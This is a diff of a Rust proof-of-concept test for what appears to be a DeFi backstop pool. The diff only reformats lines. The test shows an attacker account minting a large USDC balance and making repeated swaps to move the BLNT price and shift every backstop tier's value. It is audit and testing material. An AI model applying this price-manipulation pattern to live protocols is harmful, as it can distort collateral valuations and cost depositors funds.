@@ -45,21 +45,36 @@ fn poc_anchor_swap_moves_every_tier_value() {
     let before = fixture.backstop.pool_data(&pool_address);
     std::println!("active_value before = {}", before.active_value);
     for t in before.tiers.iter() {
-        std::println!("  tier {:?}: tokens={} value={}", t.asset, t.tokens, t.value);
+        std::println!(
+            "  tier {:?}: tokens={} value={}",
+            t.asset,
+            t.tokens,
+            t.value
+        );
     }
 
     usdc.mint(&attacker, &(20_000_000 * SCALAR_7));
     for _ in 0..4 {
         let reserve = fixture.lp.get_balance(&usdc.address);
         fixture.lp.swap_exact_amount_in(
-            &usdc.address, &(reserve / 4), &blnt.address, &0, &i128::MAX, &attacker,
+            &usdc.address,
+            &(reserve / 4),
+            &blnt.address,
+            &0,
+            &i128::MAX,
+            &attacker,
         );
     }
 
     let after = fixture.backstop.pool_data(&pool_address);
     std::println!("active_value after  = {}", after.active_value);
     for t in after.tiers.iter() {
-        std::println!("  tier {:?}: tokens={} value={}", t.asset, t.tokens, t.value);
+        std::println!(
+            "  tier {:?}: tokens={} value={}",
+            t.asset,
+            t.tokens,
+            t.value
+        );
     }
     std::println!(
         "blnt_price {} -> {}",
